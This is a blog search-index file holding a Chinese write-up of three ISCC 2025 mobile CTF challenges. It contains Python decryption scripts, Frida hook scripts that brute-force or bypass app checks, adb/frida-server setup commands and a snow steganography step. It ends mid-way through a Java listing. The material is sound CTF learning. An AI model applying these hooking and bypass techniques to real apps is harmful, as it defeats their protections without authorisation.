<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ISCC-2025-APP</title>
    <link href="/2025/05/21/ISCC-2025-APP/"/>
    <url>/2025/05/21/ISCC-2025-APP/</url>
    
    <content type="html"><![CDATA[<p>第一次打CTF遇到APP题当然浅浅记录一下啦，别喷我谢谢各位大哥！</p><p>仅仅记录一下过程哈，不做分析了因为真没学过</p><h1 id="ISCC校赛题"><a href="#ISCC校赛题" class="headerlink" title="ISCC校赛题"></a><strong>ISCC校赛题</strong></h1><h2 id="mobile1"><a href="#mobile1" class="headerlink" title="mobile1"></a><strong>mobile1</strong></h2><p>这道题就是纯粹的把apk进行分析，找到加密逻辑，解密就可以了</p><p>1.把apk进行解压，找到dex文件进行分析</p><p>2.发现加密逻辑以及加密字符串</p><p>解密脚本,不是很完善，把重复的连接部分，以及结束符’&#x2F;‘去掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_last_part</span>(<span class="hljs-params">encrypted: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    reversed_str = encrypted[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) - <span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> reversed_str)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_front_part</span>(<span class="hljs-params">encrypted: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:<br>    decoded_bytes = base64.b64decode(encrypted)<br>    xored = <span class="hljs-built_in">bytes</span>([b ^ <span class="hljs-number">0x2F</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decoded_bytes])<br>    <span class="hljs-comment"># 去掉填充或不可见字符</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> xored <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= c &lt;= <span class="hljs-number">126</span>)<br><br><span class="hljs-comment"># 示例密文</span><br>last_encrypted = <span class="hljs-string">&quot;n33EoohsV&quot;</span><br>front_encrypted = <span class="hljs-string">&quot;fRxLWQ5BHHAA&quot;</span><br><br><span class="hljs-comment"># 解密</span><br>last_part = decode_last_part(last_encrypted)<br>front_part = decode_front_part(front_encrypted)<br><br><span class="hljs-comment"># 合成原始字符串</span><br>original = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;front_part&#125;</span>_<span class="hljs-subst">&#123;last_part&#125;</span>&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Front Part:&quot;</span>, front_part)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Last Part:&quot;</span>, last_part)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Original:&quot;</span>, original)<br><br></code></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ISCC</span><span class="hljs-template-variable">&#123;R3dv!n3_k00BllepS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="mobile2"><a href="#mobile2" class="headerlink" title="mobile2"></a><strong>mobile2</strong></h2><p>把apk放入jadx分析逻辑</p><p>把MainActivity str字符替换脚本的</p><p>hook脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hooking started&quot;</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.mobile02.MainActivity&quot;</span>);<br>        <span class="hljs-keyword">const</span> enc = <span class="hljs-string">&quot;001020001001021220000012010210002201&quot;</span>; <span class="hljs-comment">// 目标对比字符串</span><br><br>        <span class="hljs-title class_">MainActivity</span>[<span class="hljs-string">&quot;stringFromJNl&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">key, input</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`MainActivity.stringFromJNl is called: key=<span class="hljs-subst">$&#123;key&#125;</span>, input=<span class="hljs-subst">$&#123;input&#125;</span>`</span>);<br>            <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;stringFromJNl&quot;</span>](key, input);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`MainActivity.stringFromJNl result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br><br>            <span class="hljs-comment">// 初始化正确 input（如果还没找到，则用原 input）</span><br>            <span class="hljs-keyword">let</span> correctInput = input.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// 转为数组方便修改</span><br><br>            <span class="hljs-comment">// 遍历 input 的每一个字符位置</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> pos = <span class="hljs-number">0</span>; pos &lt; input.<span class="hljs-property">length</span>; pos++) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\n===== Testing position <span class="hljs-subst">$&#123;pos&#125;</span> =====`</span>);<br><br>                <span class="hljs-comment">// 遍历所有可打印 ASCII 字符 (32-126)</span><br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> charCode = <span class="hljs-number">32</span>; charCode &lt;= <span class="hljs-number">126</span>; charCode++) &#123;<br>                    <span class="hljs-keyword">let</span> char = <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(charCode);<br><br>                    <span class="hljs-comment">// 替换 input 的第 pos 位为当前字符，其他位保持不变</span><br>                    input = correctInput.<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&quot;</span>)<br>                    <span class="hljs-keyword">let</span> modifiedInput =<br>                        input.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, pos) +<br>                        char +<br>                        input.<span class="hljs-title function_">substring</span>(pos + <span class="hljs-number">1</span>);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">let</span> testResult = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;stringFromJNl&quot;</span>](key, modifiedInput);<br>                        <span class="hljs-comment">// console.log(modifiedInput,testResult)</span><br>                        <span class="hljs-keyword">if</span> (testResult === enc) &#123;<br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(modifiedInput)<br>                        &#125;<br>                        <span class="hljs-comment">// 检查 testResult[6*pos] 是否等于 enc[6*pos+6]</span><br>                        <span class="hljs-keyword">const</span> testIndex = <span class="hljs-number">6</span> * pos;<br>                        <span class="hljs-keyword">const</span> encIndex = <span class="hljs-number">6</span> * pos + <span class="hljs-number">6</span>;<br><br>                        <span class="hljs-keyword">if</span> (testIndex &lt; testResult.<span class="hljs-property">length</span> &amp;&amp; encIndex &lt; enc.<span class="hljs-property">length</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (testResult.<span class="hljs-title function_">substring</span>(testIndex, encIndex) === enc.<span class="hljs-title function_">substring</span>(testIndex, encIndex)) &#123;<br>                                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`✅ Match at pos=<span class="hljs-subst">$&#123;pos&#125;</span>, char=&#x27;<span class="hljs-subst">$&#123;char&#125;</span>&#x27;: testResult[<span class="hljs-subst">$&#123;testIndex&#125;</span>]=&#x27;<span class="hljs-subst">$&#123;testResult[testIndex]&#125;</span>&#x27; == enc[<span class="hljs-subst">$&#123;encIndex&#125;</span>]=&#x27;<span class="hljs-subst">$&#123;enc[encIndex]&#125;</span>&#x27;`</span>);<br>                                correctInput[pos] = char; <span class="hljs-comment">// 记录正确的字符</span><br>                                <span class="hljs-keyword">if</span> (pos == <span class="hljs-number">5</span>) &#123;<br>                                    <span class="hljs-keyword">const</span> finalInput = correctInput.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>                                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\n🎯 Final correct input: &quot;<span class="hljs-subst">$&#123;finalInput&#125;</span>&quot;`</span>);<br>                                &#125;<br>                                <span class="hljs-keyword">else</span> &#123;<br>                                    <span class="hljs-keyword">break</span>;<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Error with char &#x27;<span class="hljs-subst">$&#123;char&#125;</span>&#x27; at pos <span class="hljs-subst">$&#123;pos&#125;</span>: <span class="hljs-subst">$&#123;e&#125;</span>`</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 输出最终正确的 input</span><br>            <span class="hljs-keyword">const</span> finalInput = correctInput.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`\n🎯 Final correct input: &quot;<span class="hljs-subst">$&#123;finalInput&#125;</span>&quot;`</span>);<br><br>            <span class="hljs-keyword">return</span> result;<br>        &#125;;<br><br>        <span class="hljs-keyword">let</span> <span class="hljs-title class_">Intrinsics</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;kotlin.jvm.internal.Intrinsics&quot;</span>);<br>        <span class="hljs-title class_">Intrinsics</span>[<span class="hljs-string">&quot;areEqual&quot;</span>].<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.Object&#x27;</span>, <span class="hljs-string">&#x27;java.lang.Object&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">obj, obj2</span>) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Intrinsics.areEqual is called: obj=<span class="hljs-subst">$&#123;obj&#125;</span>, obj2=<span class="hljs-subst">$&#123;obj2&#125;</span>`</span>);<br>            <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>[<span class="hljs-string">&quot;areEqual&quot;</span>](obj, obj2);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Intrinsics.areEqual result=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;;<br>    &#125;);<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(hook);<br></code></pre></td></tr></table></figure><p><img src="/images/ISCC-2025-APP/image-20250506204756662.png" alt="image-20250506204756662"></p><h1 id="这里记录一下frida简单使用教程"><a href="#这里记录一下frida简单使用教程" class="headerlink" title="这里记录一下frida简单使用教程"></a><strong>这里记录一下frida简单使用教程</strong></h1><p>使用frida进行hook</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">frida -U -f com.<span class="hljs-built_in">example</span>.mobile02 -l <span class="hljs-built_in">exp</span>.js<br></code></pre></td></tr></table></figure><p>frida使用教程</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">adb <span class="hljs-keyword">push</span> frida-server /data/<span class="hljs-keyword">local</span>/tmp   <span class="hljs-meta">#frida服务端上线</span><br><br>adb install apk <span class="hljs-meta">#adb把apk安装到模拟器</span><br><br>adb root <span class="hljs-built_in">shell</span> <br><br>./frida-servers上线<br><br>可以使用frida-ps -U查看正在运行的app<br></code></pre></td></tr></table></figure><p>回到mobile2</p><p>输入ISCC{XXXXXXXXXXXXXXXX}</p><p><img src="/images/ISCC-2025-APP/image-20250506205554830.png" alt="image-20250506205554830"></p><p>ISCC{‘cU2Bc’bwJ8k*9L}</p><h2 id="mobile3"><a href="#mobile3" class="headerlink" title="mobile3"></a><strong>mobile3</strong></h2><h3 id="第一部分flag"><a href="#第一部分flag" class="headerlink" title="第一部分flag"></a>第一部分flag</h3><p><img src="/images/ISCC-2025-APP/image-20250506094529879.png" alt="image-20250506094529879"></p><p>简单置换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 自定义Base64编码字母表</span><br>CUSTOM_ALPHABET = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&gt;&lt;&quot;</span><br><span class="hljs-comment"># 经过自定义Base64编码的密文</span><br>ENCRYPTED_FLAG = <span class="hljs-string">&quot;svndq3TtocPLtta=&quot;</span><br><span class="hljs-comment"># 标准Base64编码字母表</span><br>STANDARD_ALPHABET = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">translate_to_standard</span>(<span class="hljs-params">s</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> CUSTOM_ALPHABET:<br>            index = CUSTOM_ALPHABET.index(char)<br>            result += STANDARD_ALPHABET[index]<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">s</span>):<br>    standard_encoded = translate_to_standard(s)<br>    <span class="hljs-comment"># 解码前可能需要补齐等号</span><br>    padding = <span class="hljs-built_in">len</span>(standard_encoded) % <span class="hljs-number">4</span><br>    <span class="hljs-keyword">if</span> padding:<br>        standard_encoded += <span class="hljs-string">&#x27;=&#x27;</span> * (<span class="hljs-number">4</span> - padding)<br>    decoded_bytes = base64.b64decode(standard_encoded)<br>    <span class="hljs-keyword">return</span> decoded_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    <span class="hljs-keyword">return</span> decrypt_flag(ENCRYPTED_FLAG)<br><br><span class="hljs-comment"># 调用函数并输出结果</span><br>flag = get_flag()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密后的结果:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ISCC</span>&#123;<span class="hljs-built_in">S8</span>*eM0<br></code></pre></td></tr></table></figure><h3 id="第二部分flag"><a href="#第二部分flag" class="headerlink" title="第二部分flag"></a>第二部分flag</h3><h4 id="snow隐写"><a href="#snow隐写" class="headerlink" title="snow隐写"></a>snow隐写</h4><p>Hook绕过+key</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus">function <span class="hljs-selector-tag">main</span>()&#123;<br> Java<span class="hljs-selector-class">.perform</span>(<span class="hljs-built_in">function</span>()&#123;<br> <span class="hljs-selector-tag">var</span> MainActivity = Java<span class="hljs-selector-class">.use</span>(<span class="hljs-string">&quot;com.example.mobile03.MainActivity&quot;</span>)<br> <span class="hljs-selector-tag">var</span> showAd = MainActivity<span class="hljs-selector-class">.showAd</span><br> showAd<span class="hljs-selector-class">.implementation</span> = <span class="hljs-built_in">function</span>()&#123;<br> &#125;<br> &#125;)<br> <span class="hljs-selector-tag">var</span> MainActivity = Java<span class="hljs-selector-class">.use</span>(<span class="hljs-string">&quot;com.example.mobile03.MainActivity&quot;</span>)<br> <span class="hljs-selector-tag">var</span> Jformat = MainActivity<span class="hljs-selector-class">.Jformat</span><br> Jformat<span class="hljs-selector-class">.implementation</span> = <span class="hljs-built_in">function</span>(str1, str2)&#123;<br> console<span class="hljs-selector-class">.log</span>(str1, str2)<br> <span class="hljs-selector-tag">var</span> result = this<span class="hljs-selector-class">.Jformat</span>(str1, str2)<br> console<span class="hljs-selector-class">.log</span>(result)<br> return result<br> &#125;<br> <span class="hljs-comment">//715000</span><br> &#125;<br> <span class="hljs-built_in">setImmediate</span>(main)<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">frida -U -f com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.mobile03</span> -l mobile3.js<br></code></pre></td></tr></table></figure><p>输入ISCC{XXXXXXXXXXXX}</p><p> key</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">524689<br></code></pre></td></tr></table></figure><h4 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h4><p>apk解压后在lib&#x2F;下有个10kb大小的文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">snow<span class="hljs-selector-class">.exe</span>  -C -<span class="hljs-selector-tag">p</span> <span class="hljs-string">&quot;524689&quot;</span> txt<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">729</span>ff<span class="hljs-number">2e082</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>b<span class="hljs-number">209</span>ae<span class="hljs-number">1e590</span>fb<span class="hljs-number">88097465</span><span class="hljs-keyword">c</span><span class="hljs-number">779</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>a<span class="hljs-number">17</span>a<span class="hljs-number">10</span>aebc<span class="hljs-number">7</span>dd<span class="hljs-number">26</span>d<span class="hljs-number">52</span>fc<span class="hljs-number">8</span>bfa<span class="hljs-number">5726</span>bb<span class="hljs-number">2</span>b<span class="hljs-number">0</span>b<span class="hljs-number">1</span>d<span class="hljs-number">80028</span>a<span class="hljs-number">8</span>aedff<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2874</span>bddaff<span class="hljs-number">4</span>ad<span class="hljs-number">9</span>ab<span class="hljs-number">7</span>ac<span class="hljs-number">881109e1</span><span class="hljs-keyword">c</span><span class="hljs-number">6e03177816525</span>d<span class="hljs-number">88472e0</span>cf<span class="hljs-number">452</span>f<span class="hljs-number">708</span>ea<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">559</span>edcf<span class="hljs-number">70297e593</span>a<span class="hljs-number">162</span>b<span class="hljs-number">5201</span><span class="hljs-keyword">c</span><span class="hljs-number">0134e2</span>d<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">04</span>f<span class="hljs-number">1723381243</span>f<span class="hljs-number">5587</span>f<span class="hljs-number">9831</span>df<span class="hljs-number">57</span>d<span class="hljs-number">266489</span>b<span class="hljs-number">2195</span>a<span class="hljs-number">7</span>db<span class="hljs-number">2</span>aa<span class="hljs-number">9881</span>feb<span class="hljs-number">475</span>aa<span class="hljs-number">6</span>b<span class="hljs-number">54</span>d<span class="hljs-number">973</span>da<span class="hljs-number">18</span>bbe<span class="hljs-number">558e6459</span>cf<span class="hljs-number">785721750</span>b<span class="hljs-number">4</span>da<span class="hljs-number">0</span>a<span class="hljs-number">43</span>ca<span class="hljs-number">4</span>ab<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">010</span>d<span class="hljs-number">57</span>f<span class="hljs-number">6</span>adf<span class="hljs-number">5</span>d<span class="hljs-number">604839</span>b<span class="hljs-number">94</span>dbb<span class="hljs-number">68</span>b<span class="hljs-number">76</span>b<span class="hljs-number">94526</span>a<span class="hljs-number">22483e10</span>b<span class="hljs-number">8</span>f<span class="hljs-number">844979</span>cfb<span class="hljs-number">79</span>f<span class="hljs-number">2</span>ac<span class="hljs-number">98</span><span class="hljs-keyword">c</span><span class="hljs-number">07e9</span>e<span class="hljs-number">28</span>dfb<span class="hljs-number">04</span><span class="hljs-keyword">c</span><span class="hljs-number">77</span>d<span class="hljs-number">56877</span>bb<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">10</span>b<span class="hljs-number">0</span>a<span class="hljs-number">7</span>d<span class="hljs-number">0</span>a<span class="hljs-number">7539</span>b<span class="hljs-number">8623</span>f<span class="hljs-number">97</span>cae<span class="hljs-number">8</span>ff<span class="hljs-number">2</span>b<span class="hljs-number">560</span>bdc<span class="hljs-number">8e1970</span>eae<span class="hljs-number">8002</span>f<span class="hljs-number">040</span>b<span class="hljs-number">070</span>b<span class="hljs-number">235</span>ffd<span class="hljs-number">61</span>f<span class="hljs-number">8</span>a<span class="hljs-number">53</span><span class="hljs-keyword">c</span><span class="hljs-number">9201</span>af<span class="hljs-number">8369</span>d<span class="hljs-number">0</span>d<span class="hljs-number">2</span>a<span class="hljs-number">43644</span>ef<span class="hljs-number">907</span>b<span class="hljs-number">79</span>b<span class="hljs-number">08</span><span class="hljs-keyword">ccc</span><span class="hljs-number">426</span>b<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>f<span class="hljs-number">9</span>a<span class="hljs-number">576</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>d<span class="hljs-number">70</span>cd<span class="hljs-number">27</span>fead<span class="hljs-number">1194</span>bab<span class="hljs-number">79151</span>f<span class="hljs-number">4</span>afc<span class="hljs-number">7</span>f<span class="hljs-number">5</span>f<span class="hljs-number">5e07</span>f<span class="hljs-number">101</span>d<span class="hljs-number">31</span>d<span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">606943139</span>b<span class="hljs-number">874498</span>d<span class="hljs-number">090608</span>f<span class="hljs-number">11</span>aa<span class="hljs-number">96433</span>de<span class="hljs-number">65466</span>a<span class="hljs-number">73688</span>f<span class="hljs-number">5796</span>cf<span class="hljs-number">595</span>faba<span class="hljs-number">453</span>fbc<span class="hljs-number">14925</span>ebb<span class="hljs-number">77323</span>eb<span class="hljs-number">9e8</span>ae<span class="hljs-number">1031</span>a<span class="hljs-number">227</span>d<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>f<span class="hljs-number">0401650826</span>fd<span class="hljs-number">52</span>a<span class="hljs-number">8</span>ce<span class="hljs-number">6</span>a<span class="hljs-number">277</span>f<span class="hljs-number">490</span>d<span class="hljs-number">997e00</span>ff<span class="hljs-number">89765e1</span>dd<span class="hljs-number">45201e06732</span>e<span class="hljs-number">60248</span>ac<span class="hljs-number">0</span>d<span class="hljs-number">122</span>fc<span class="hljs-number">4343</span>fce<span class="hljs-number">1</span>cfd<span class="hljs-number">160</span>a<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">27</span>ecbc<span class="hljs-number">7794</span>b<span class="hljs-number">4</span>bfaafd<span class="hljs-number">17</span>b<span class="hljs-number">5e647755139</span>b<span class="hljs-number">0</span>fc<span class="hljs-number">15943327</span>b<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>a<span class="hljs-number">5</span>bb<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>b<span class="hljs-number">14e3</span>b<span class="hljs-number">485</span>f<span class="hljs-number">90</span>faf<span class="hljs-number">3</span>f<span class="hljs-number">8835</span><span class="hljs-keyword">c</span><span class="hljs-number">461</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>ab<span class="hljs-number">7</span>cb<span class="hljs-number">759</span>f<span class="hljs-number">5332190</span>b<span class="hljs-number">7</span>def<span class="hljs-number">406518688479</span><br></code></pre></td></tr></table></figure><p>获取私钥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 